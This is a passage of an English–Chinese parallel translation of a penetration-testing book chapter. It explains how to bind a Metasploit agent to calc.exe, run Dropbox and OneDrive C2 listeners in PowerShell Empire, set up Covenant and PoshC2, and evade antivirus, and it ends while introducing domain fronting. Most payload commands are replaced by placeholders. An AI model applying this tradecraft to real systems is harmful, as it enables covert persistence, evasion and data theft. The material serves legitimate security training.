  zh: 要创建多重编码的有效负载，请使用以下命令：
- en: '[PRE14]'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE14]'
- en: You can also encode `msfvenom` to an existing executable, and both the modified
    executable and the persistent agent will function. To bind the persistent agent
    to an executable such as a calculator (`calc.exe`), first, copy the appropriate
    `calc.exe` file into Kali Linux. You can download it from your existing session
    using Meterpreter by running `meterpreter > download c:\\windows\\system32\\calc.exe`.
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你还可以将`msfvenom`编码到现有的可执行文件中，修改后的可执行文件和持久性代理都将正常工作。要将持久性代理绑定到可执行文件（如计算器`calc.exe`），首先在Kali
    Linux中复制适当的`calc.exe`文件。你可以通过Meterpreter从现有会话中下载它，运行`meterpreter > download c:\\windows\\system32\\calc.exe`。
- en: 'When the file is downloaded, run the following command:'
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载文件后，运行以下命令：
- en: '[PRE15]'
  id: totrans-114
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE15]'
- en: The agent can be placed on the target system, renamed `calc.exe` (to replace
    the original calculator if access is denied, place the file on the desktop), and
    then executed.
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以将代理放置在目标系统上，并重命名为`calc.exe`（如果访问被拒绝，可以将文件放在桌面上），然后执行。
- en: Unfortunately, nearly all Metasploit-encoded executables can be detected by
    client antivirus or EDR software. This has been attributed to penetration testers
    who have submitted encrypted payloads to sites such as VirusTotal ([www.virustotal.com](http://www.virustotal.com)).
    However, you can create an executable and then encrypt it using Veil-Evasion,
    as described in *Chapter 10*, *Exploitation*.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，几乎所有Metasploit编码的可执行文件都可能被客户端防病毒软件或EDR软件检测到。这归因于渗透测试人员将加密的有效负载提交到VirusTotal等网站（[www.virustotal.com](http://www.virustotal.com)）。然而，你可以创建一个可执行文件，然后使用Veil-Evasion进行加密，具体描述见*第10章*，*利用*。
- en: Persistence using online file storage cloud services
  id: totrans-117
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用在线文件存储云服务来维持持久性
- en: Every organization that allows file sharing with cloud services is likely to
    make use of either Dropbox or OneDrive. Attackers can use these file storage services
    to maintain persistence on compromised systems.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 允许与云服务共享文件的每个组织可能会使用Dropbox或OneDrive。攻击者可以利用这些文件存储服务在受损系统上维持持久性。
- en: In this section, we will focus on using these file storage cloud services on
    the victim system and maintaining persistence to run C2 without having to disclose
    the attacker’s backend IP address by using the Empire PowerShell tool.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将重点介绍在受害者系统上使用这些文件存储云服务，并通过使用Empire PowerShell工具来维持持久性，以运行C2，而无需透露攻击者后端IP地址。
- en: Dropbox
  id: totrans-120
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Dropbox
- en: For companies using Dropbox, this listener serves as a highly reliable C2 channel.
    The `dbx` post-exploitation module is preloaded in our PowerShell Empire tool,
    which utilizes Dropbox infrastructure. Agents communicate with Dropbox, allowing
    it to be used as a C2 center.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 对于使用Dropbox的公司，此监听器可作为高度可靠的C2通道。我们的PowerShell Empire工具中预加载了`dbx`后渗透模块，利用Dropbox基础设施。代理与Dropbox通信，允许其用作C2中心。
- en: 'Follow these steps to set up a Dropbox stager:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 按照以下步骤设置Dropbox分段器：
- en: Create a Dropbox account.
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 创建一个Dropbox账户。
- en: Go to My Apps on the Dropbox Developers site ([https://www.dropbox.com/developers](https://www.dropbox.com/developers)).
  id: totrans-124
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 前往Dropbox开发者网站的我的应用([https://www.dropbox.com/developers](https://www.dropbox.com/developers))页面。
- en: Go to **App Console** and click **Create App**.
  id: totrans-125
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入**应用控制台**，点击**创建应用**。
- en: Choose a **Scoped access New** API.
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择一个**Scoped access New** API。
- en: Set the type of access you need as **Full Dropbox– Access to all files and folders
    in a user’s Dropbox**.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将需要的访问类型设置为**完全访问Dropbox – 可访问用户Dropbox中所有文件和文件夹**。
- en: Enter the name of the app, for example, `KaliC2C`, hit **Create app**, and tick
    the box to accept the terms and conditions.
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入应用程序的名称，例如，`KaliC2C`，点击**创建应用**，并勾选同意条款和条件。
- en: After the application is created, Dropbox should take us to the settings page.
    Before you generate the key, you need to navigate to the **Permissions** tab and
    ensure the write permissions are set by ticking **files.metadata.read**, **files.metadata.write**,
    **files.content.write**, and **files.content.read**.
  id: totrans-129
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用程序创建后，Dropbox 应将我们带到设置页面。在生成密钥之前，您需要转到**权限**选项卡，并确保通过选中**files.metadata.read**、**files.metadata.write**、**files.content.write**和**files.content.read**来设置写入权限。
- en: Now we are all set to generate the token. Click on the **Settings** tab if you
    are in the **Permissions** tab from the previous step. In the **OAuth 2** section
    and the **Generated access token** heading, click on **Generate** and you should
    see Dropbox creating a new token, as seen in *Figure 13.8*:![](../Images/B17765_13_08.png)
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们已经准备好生成令牌。如果你在前一步骤的**权限**选项卡中，点击**设置**选项卡。在**OAuth 2**部分和**生成的访问令牌**标题下，点击**生成**，你应该看到
    Dropbox 正在创建一个新的令牌，如 *图 13.8* 所示：![](../Images/B17765_13_08.png)
- en: 'Figure 13.8: Generating the dropbox access token'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.8：生成 Dropbox 访问令牌
- en: 'You can now use the generated access token to generate the payload on our Empire
    tool by running the following commands:'
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 您现在可以通过运行以下命令在我们的 Empire 工具上使用生成的访问令牌生成有效载荷：
- en: '[PRE16]'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'The output should be as shown here:'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出应如此显示：
- en: '![](../Images/B17765_13_09.png)'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_09.png)'
- en: 'Figure 13.9: Successfully creating the Dropbox listener in PowerShell Empire'
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.9：在 PowerShell Empire 中成功创建 Dropbox 监听器
- en: 'If the API token is correct and everything works, the Dropbox account should
    now show a folder named `Empire`, with three subfolders called `results`, `staging`,
    and `taskings`, as shown in *Figure 13.10*:'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果 API 令牌正确并且一切正常，Dropbox 账户现在应显示名为 `Empire` 的文件夹，其中包含名为 `results`、`staging`
    和 `taskings` 的三个子文件夹，如 *图 13.10* 所示：
- en: '![](../Images/B17765_13_10.png)'
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_10.png)'
- en: 'Figure 13.10: Folders generated within the Dropbox'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.10：在 Dropbox 内生成的文件夹
- en: Once the listener is up and running, attackers can utilize a number of methods
    to deliver the payload, for example, by running it from the existing Meterpreter
    session, by using social engineering, or by creating a scheduled task to report
    back every time the system boots.
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦监听器启动运行，攻击者可以利用多种方法传递有效载荷，例如，通过从现有 Meterpreter 会话中运行，使用社会工程学，或创建一个定期任务以在系统启动时报告。
- en: 'Attackers can make use of any free file hosting service to store the payload
    and get the victim machines to download and execute the agent. A successful agent
    will report to Empire, as shown in *Figure 13.11*:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以利用任何免费的文件托管服务来存储有效载荷，并让受害机下载并执行代理程序。成功的代理程序将向 Empire 报告，如 *图 13.11* 所示：
- en: '![A screenshot of a computer  Description automatically generated with medium
    confidence](../Images/B17765_13_11.png)'
  id: totrans-142
  prefs: []
  type: TYPE_IMG
  zh: '![一台计算机的屏幕截图，自动生成的描述，中等置信度](../Images/B17765_13_11.png)'
- en: 'Figure 13.11: Successful interaction from the target to our listener using
    the Dropbox API'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.11：使用 Dropbox API 成功与我们的监听器进行交互
- en: Microsoft OneDrive
  id: totrans-144
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Microsoft OneDrive
- en: 'OneDrive is another popular file-sharing service, similar to Dropbox. In the
    latest version of Empire, you should be able to see an additional prebuilt listener,
    `onedrive`, as shown in *Figure 13.12*:'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: OneDrive 是另一个流行的文件共享服务，类似于 Dropbox。在 Empire 的最新版本中，您应该能够看到一个额外的预构建监听器 `onedrive`，如
    *图 13.12* 所示：
- en: '![](../Images/B17765_13_12.png)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_12.png)'
- en: 'Figure 13.12: PowerShell Empire OneDrive listener options'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.12：PowerShell Empire OneDrive 监听器选项
- en: 'Set up the `onedrive` C2C as follows:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 设置 `onedrive` C2C 如下所示：
- en: Create a Microsoft developer account. Attackers can leverage the free account
    that Microsoft provides with credits and log in to the Azure portal ([https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade)).
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 创建一个 Microsoft 开发者账户。攻击者可以利用 Microsoft 提供的带有积分的免费账户登录 Azure 门户 ([https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade))。
- en: To register a new application, click on **New Registration** and enter your
    name and select **Accounts in any organizational directory (Any Azure AD directory
    - Multitenant) and personal Microsoft accounts (e.g. Skype, Xbox)**. Then, enter
    `https://login.live.com/oauth20_desktop.srf` with the redirect URI so that PowerShell
    Empire can authenticate using the offline desktop module, as shown in *Figure
    13.13*. Finally, click on **Register**:![](../Images/B17765_13_13.png)
  id: totrans-150
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要注册一个新应用程序，点击 **New Registration**，输入你的名称，并选择 **Accounts in any organizational
    directory (Any Azure AD directory - Multitenant) and personal Microsoft accounts
    (e.g. Skype, Xbox)**。然后，输入 `https://login.live.com/oauth20_desktop.srf` 作为重定向
    URI，这样 PowerShell Empire 就可以使用离线桌面模块进行认证，如*图 13.13*所示。最后，点击 **Register**：![](../Images/B17765_13_13.png)
- en: 'Figure 13.13: Registration of KaliC2C in Azure for offline authentication'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.13：在 Azure 中注册 KaliC2C 进行离线认证
- en: Once the application is created, attackers should be able to see a newly created
    Application ID, as shown here:![](../Images/B17765_13_14.png)
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦创建了应用程序，攻击者应该能够看到新创建的应用程序 ID，如下图所示：![](../Images/B17765_13_14.png)
- en: 'Figure 13.14: Client ID generation within the Azure portal'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.14：在 Azure 门户中生成 Client ID
- en: Now that we have the `ClientID`, we will need to create a `ClientSecret`. Navigate
    to **Certificates & Sections** under the **Manage** section within the same page
    and, under **Client secrets**, click on **New client secret**. That should bring
    up another window, enter any description, by default, expiry should point to 6
    months, and finally click on **Add**. This should generate our Client Secret ID,
    as shown in *Figure 13.15*:![](../Images/B17765_13_15.png)
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们有了 `ClientID`，接下来需要创建 `ClientSecret`。在同一页面中的 **Manage** 部分下，导航到 **Certificates
    & Sections**，然后在 **Client secrets** 下点击 **New client secret**。这时会弹出另一个窗口，输入任何描述，默认情况下，过期时间为
    6 个月，最后点击 **Add**。这应该会生成我们的 Client Secret ID，如*图 13.15*所示：![](../Images/B17765_13_15.png)
- en: 'Figure 13.15: Creating a Secret ID for the ClientID'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.15：为 ClientID 创建 Secret ID
- en: Now, we are ready to fire up Empire and set up our listener. Set the `ClientID`
    to the Application ID from *step 3*, set the `ClientSecret` to the Secret ID value
    from *step 4*, and execute the listener, as shown in *Figure 13.16*:![](../Images/B17765_13_16.png)
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们准备启动 Empire 并设置我们的监听器。将 `ClientID` 设置为*第 3 步*中的应用程序 ID，将 `ClientSecret`
    设置为*第 4 步*中的 Secret ID 值，并执行监听器，如*图 13.16*所示：![](../Images/B17765_13_16.png)
- en: 'Figure 13.16: Configuring our PowerShell Empire with the ClientID and SecretValue
    that we created'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.16：使用我们创建的 ClientID 和 SecretValue 配置 PowerShell Empire
- en: The URL can be opened in a browser to generate the authentication code. Testers
    should log in to the application and will prompt for permission to access the
    OneDrive files. Once you click **Yes**, then you should see the code generated
    in the URL, as shown in *Figure 13.17*:![](../Images/B17765_13_17.png)
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以在浏览器中打开 URL 以生成认证代码。测试者应登录到应用程序并会提示授权访问 OneDrive 文件。点击 **Yes** 后，你应该能看到 URL
    中生成的代码，如*图 13.17*所示：![](../Images/B17765_13_17.png)
- en: 'Figure 13.17: Authentication token generation in the browser'
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.17：浏览器中的认证令牌生成
- en: The code from the URL can now be used to set up the Empire listener, as follows:![](../Images/B17765_13_18.png)
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在可以使用来自 URL 的代码来设置 Empire 监听器，如下所示：![](../Images/B17765_13_18.png)
- en: 'Figure 13.18: Setting the AuthCode and starting the OneDrive listener'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.18：设置 AuthCode 并启动 OneDrive 监听器
- en: Just as with Dropbox, you should now be able to see a folder named `Empire`
    with three subfolders, called `results`, `staging`, and `taskings`, in your OneDrive,
    with the correct Client ID and authentication code, as shown here:![](../Images/B17765_13_19.png)
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 就像 Dropbox 一样，现在你应该能够在 OneDrive 中看到一个名为 `Empire` 的文件夹，里面有三个子文件夹，分别是 `results`、`staging`
    和 `taskings`，并且具有正确的客户端 ID 和认证代码，如下图所示：![](../Images/B17765_13_19.png)
- en: 'Figure 13.19: Folders that are created in OneDrive once the listener started'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.19：启动监听器后在 OneDrive 中创建的文件夹
- en: Now you can stage the payload by running `usestager multi/launcher` and setting
    the `listener` to `onedrive` and then executing the payload. Once the payload
    is executed successfully on the target, this should listen on the OneDrive listener,
    as shown in *Figure 13.20*:![](../Images/B17765_13_20.png)
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，你可以通过运行 `usestager multi/launcher` 来准备有效载荷，并将 `listener` 设置为 `onedrive`，然后执行有效载荷。一旦有效载荷在目标上成功执行，它将监听
    OneDrive 监听器，如*图 13.20*所示：![](../Images/B17765_13_20.png)
- en: 'Figure 13.20: Agent successfully reporting back to the PowerShell Empire over
    the OneDrive API'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.20：代理通过 OneDrive API 成功报告回 PowerShell Empire
- en: Covenant
  id: totrans-166
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Covenant
- en: 'Attackers can also leverage the **Covenant C2** framework for penetration testing
    operations to maintain access to the target environment. This framework is written
    in .NET and is by Ryan Cobb of SpecterOps. This framework utilizes a majority
    of the open source features and plugins to perform different exploitations on
    the target with access. To install the Covenant C2 framework in Kali Linux, the
    following steps are involved:'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者还可以利用**Covenant C2**框架进行渗透测试操作，以维护对目标环境的访问。该框架是由SpecterOps的Ryan Cobb编写的，使用.NET编写，并利用大多数开源功能和插件来在目标上执行不同的利用。要在Kali
    Linux中安装Covenant C2框架，需要执行以下步骤：
- en: Download the repository by running `sudo git clone --recurse-submodules https://github.com/cobbr/Covenant`.
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`sudo git clone --recurse-submodules https://github.com/cobbr/Covenant`来下载存储库。
- en: Since the tools heavily rely on the .NET framework, we will be downloading the
    Microsoft package to our Kali by running `sudo wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb
    -O packages-microsoft-prod.deb`.
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于这些工具严重依赖于.NET框架，我们将通过运行`sudo wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb
    -O packages-microsoft-prod.deb`将Microsoft包下载到我们的Kali中。
- en: Once the deb file is downloaded, install the package by running `sudo dpkg -i
    packages-microsoft-prod.deb`.
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载.deb文件后，通过运行`sudo dpkg -i packages-microsoft-prod.deb`来安装该软件包。
- en: Covenant requires .NET version 3.1, so we will run the following dependencies
    to install the requirements by running `sudo apt-get update && sudo apt-get install
    -y apt-transport-https && sudo apt-get update && sudo apt-get install -y dotnet-sdk-3.1`.
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Covenant需要.NET版本3.1，因此我们将通过运行`sudo apt-get update && sudo apt-get install -y
    apt-transport-https && sudo apt-get update && sudo apt-get install -y dotnet-sdk-3.1`来运行以下依赖项。
- en: Now we are ready to build the application by changing our folder to the project
    location, which is `cd Covenant/Covenant`, and run `sudo dotnet build` and `sudo
    dotnet run`.
  id: totrans-172
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们准备通过将文件夹更改为项目位置来构建应用程序，即`cd Covenant/Covenant`，并运行`sudo dotnet build`和`sudo
    dotnet run`。
- en: If no errors are generated, then attackers should be able to see the following
    screen and be able to access Covenant on localhost on port `7443`:![](../Images/B17765_13_21.png)
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果未生成任何错误，则攻击者应该能够看到以下屏幕并能够在localhost的端口`7443`上访问Covenant:![](../Images/B17765_13_21.png)
- en: 'Figure 13.21: Covenant starting in Kali using dotnet'
  id: totrans-174
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '图 13.21: 在Kali中使用dotnet启动Covenant'
- en: Once the application is launched in the browser, you can create a username and
    password to log in.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用程序启动后，在浏览器中可以创建用户名和密码以登录。
- en: Similar to PowerShell Empire, Covenant provides options for the attackers to
    create the exploit payloads using listeners, launchers, templates, and tasks,
    where agents are referred to as grunts. The next step would be for attackers to
    create the listener and make sure that `ConnectAddresses` reflects the right IP
    address of the Kali Linux where the grunts can call back:![](../Images/B17765_13_22.png)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 类似于PowerShell Empire，Covenant为攻击者提供使用侦听器、启动器、模板和任务创建利用有效载荷的选项，其中代理被称为grunts。下一步是为攻击者创建侦听器，并确保`ConnectAddresses`反映Kali
    Linux的正确IP地址，grunts可以在其中回调:![](../Images/B17765_13_22.png)
- en: 'Figure 13.22: Configuring the Covenant connect back address'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '图 13.22: 配置Covenant回连地址'
- en: Finally, generate the exploit payload by navigating to the launchers and selecting
    any of the options; for example, we have selected PowerShell Launcher. The tool
    should present you with the following figure and options. Upon selecting the right
    listeners, you should be able to generate a payload that is both encoded and non-encoded:![](../Images/B17765_13_23.png)
  id: totrans-178
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，通过导航到启动器并选择其中任何一个选项来生成利用有效载荷；例如，我们选择了PowerShell启动器。工具应该呈现给您以下图表和选项。选择正确的侦听器后，您应该能够生成编码和非编码的有效载荷:![](../Images/B17765_13_23.png)
- en: 'Figure 13.23: Setting the right listener and generating the payload in the
    PowerShell Launcher section'
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '图 13.23: 在PowerShell启动器部分设置正确的侦听器并生成有效载荷'
- en: Once the payload is executed at the target, that should allow us to interact
    from the Covenant C2, as seen in *Figure 13.24*:![](../Images/B17765_13_24.png)
  id: totrans-180
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦在目标上执行有效载荷，就可以从Covenant C2与之进行交互，如*图 13.24*所示:![](../Images/B17765_13_24.png)
- en: 'Figure 13.24: Indication of victim connecting the Covenant C2'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '图 13.24: 指示受害者连接Covenant C2'
- en: We can now interact with the target by navigating to **Grunts** in the main
    menu and clicking on **Interact** to run pre-loaded scripts that can be run on
    the target device, as seen in *Figure 13.25*:![](../Images/B17765_13_25.png)
  id: totrans-182
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以通过在主菜单中导航到**Grunts**并点击**Interact**来与目标交互，执行可以在目标设备上运行的预加载脚本，如*图 13.25*所示：![](../Images/B17765_13_25.png)
- en: 'Figure 13.25: Interacting with the target using the Covenant Interact section'
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.25：使用 Covenant 的 Interact 部分与目标交互
- en: If there are two or three testers on the same target, they would be able to
    see all the tasks performed by clicking on the **Taskings** tab.
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果有两个或三个测试人员在同一目标上，他们可以通过点击**任务**标签查看所有执行的任务。
- en: Covenant allows testers to leverage all the post-exploit and lateral movement
    modules within the tool during penetration testing to capture the crown jewels
    or to exfiltrate confidential database files.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: Covenant 允许测试人员在渗透测试过程中利用该工具中的所有后期利用和横向移动模块，捕获核心目标或窃取机密数据库文件。
- en: PoshC2
  id: totrans-186
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: PoshC2
- en: One other C2 that pen testers can also leverage is PoshC2\. It is a proxy-aware
    C2 framework that comes in very handy for post-exploitation and lateral movement.
    The tool is written in Python3, and the latest version as of December 2021 is
    7.4.0\. The tool has gone through significant improvements over the years.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种渗透测试人员也可以利用的 C2 是 PoshC2。它是一个具有代理意识的 C2 框架，非常适合用于后期利用和横向移动。该工具使用 Python3
    编写，截至 2021 年 12 月的最新版本为 7.4.0。多年来，该工具经历了显著的改进。
- en: It is possible to add your own modules and tools. By default, the PoshC2 installation
    comes with PowerShell, C#, Python3, C++, DLLs, and shellcode. The exploit payloads
    injected within PoshC2 are called implants. These implants work on pretty much
    all operating systems, including Windows, *nix, and OSX.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以添加自己的模块和工具。默认情况下，PoshC2 安装包含 PowerShell、C#、Python3、C++、DLL 和 Shellcode。注入
    PoshC2 的利用负载称为植入物。这些植入物几乎适用于所有操作系统，包括 Windows、*nix 和 OSX。
- en: 'The following are the steps involved in successfully setting up a PoshC2 on
    Kali Linux:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是在 Kali Linux 上成功设置 PoshC2 的步骤：
- en: Download the application by running `git clone --recursive` ([https://github.com/nettitude/PoshC2](https://github.com/nettitude/PoshC2))
    and `cd PoshC2` and run `sudo ./Install.sh`.
  id: totrans-190
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行 `git clone --recursive`（[https://github.com/nettitude/PoshC2](https://github.com/nettitude/PoshC2)）并执行
    `cd PoshC2` 和 `sudo ./Install.sh` 来下载该应用程序。
- en: Testers may receive an error message relating to the dotnet; however, that does
    not stop the application from running.
  id: totrans-191
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 测试人员可能会收到与 dotnet 相关的错误消息，但这并不会阻止应用程序的运行。
- en: Set up a new project by running `sudo posh-project –n nameoftheproject`.
  id: totrans-192
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行 `sudo posh-project –n nameoftheproject` 设置一个新项目。
- en: Once the project is set up, configure the C2 server by editing the configuration
    file located at `/var/Poshc2/<nameoftheproject>/configure.yml` and edit the right
    `PayloadCommsHost` to the right IP address or domain name. You can also choose
    to enter the domain’s front header (we will learn how to use the domain front
    in the next section).
  id: totrans-193
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦项目设置完成，通过编辑位于 `/var/Poshc2/<nameoftheproject>/configure.yml` 的配置文件来配置 C2 服务器，并将正确的
    `PayloadCommsHost` 编辑为正确的 IP 地址或域名。您还可以选择输入域名的前置头（我们将在下一节学习如何使用域名前置）。
- en: Finally, run the C2 server by running `sudo posh-server` in the terminal and
    you should be able to see the confirmation as seen in *Figure 13.26*, with all
    the payloads and their relevant location details:![](../Images/B17765_13_26.png)
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，通过在终端运行`sudo posh-server`启动 C2 服务器，您应该能够看到如*图 13.26*所示的确认信息，显示所有有效负载及其相关位置详情：![](../Images/B17765_13_26.png)
- en: 'Figure 13.26: Successfully launching the PoshC2 server'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.26：成功启动 PoshC2 服务器
- en: Once the payload is executed on the target, attackers can connect to the PoshC2
    server by running `sudo posh –u <username>` in the Kali Linux terminal. They should
    be able to see the implant reporting to the server as seen in *Figure 13.27*.
    Similar to Metasploit, pen testers can now use the number of the implant to interact
    with the target:![](../Images/B17765_13_27.png)
  id: totrans-196
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦有效负载在目标上执行，攻击者可以通过在 Kali Linux 终端运行 `sudo posh –u <username>` 连接到 PoshC2 服务器。他们应该能够看到植入物向服务器报告，如*图
    13.27*所示。与 Metasploit 类似，渗透测试人员现在可以使用植入物的编号与目标交互：![](../Images/B17765_13_27.png)
- en: 'Figure 13.27: Target reporting to the PoshC2 server as an implant'
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.27：目标作为植入物报告给 PoshC2 服务器
- en: Although the majority of antivirus/EDR software can detect the payload, attackers
    can always leverage tools such as `PyFuscator` to scramble the payload for PowerShell,
    successfully evade detection, and quickly migrate to a legitimate process.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管大多数防病毒/EDR 软件可以检测到有效载荷，攻击者始终可以利用工具如 `PyFuscator` 对 PowerShell 的有效载荷进行混淆，成功躲避检测，并迅速迁移到合法进程。
- en: Domain fronting
  id: totrans-199
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 域名伪装
- en: Domain fronting is a technique engaged by attackers or red teams to avoid detection
    of their C2 servers. It is the art of hiding the attacker’s machine behind highly
    trusted domains by routing the traffic through an application utilizing someone
    else’s domain name (or, in the case of HTTPS, someone else’s SSL certificate).
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 域名伪装是一种技术，攻击者或红队用来避免检测到他们的 C2 服务器。这是通过利用他人的域名（或者在 HTTPS 的情况下，使用他人的 SSL 证书）来将流量路由到一个应用程序，从而将攻击者的机器隐藏在高度信任的域名背后。
- en: The most popular services include Amazon’s CloudFront, Microsoft Azure, and
    Google App Engine. The same domain fronting techniques can be used on corporate
    webmail for C2 and data exfiltration through SMTP protocols.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 最受欢迎的服务包括亚马逊的 CloudFront、微软的 Azure 和谷歌的 App Engine。相同的域名伪装技术也可以用于企业 Web 邮件中的
    C2 和通过 SMTP 协议进行数据外泄。
- en: Note that Google and Amazon both implemented strategies to guard against domain
    fronting in April 2018\. In this section, we will explore how to use Amazon CloudFront
    and Microsoft Azure for C2, using two different methods.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，谷歌和亚马逊都在 2018 年 4 月实施了防范域名伪装的策略。在本节中，我们将探讨如何使用亚马逊 CloudFront 和微软 Azure 进行
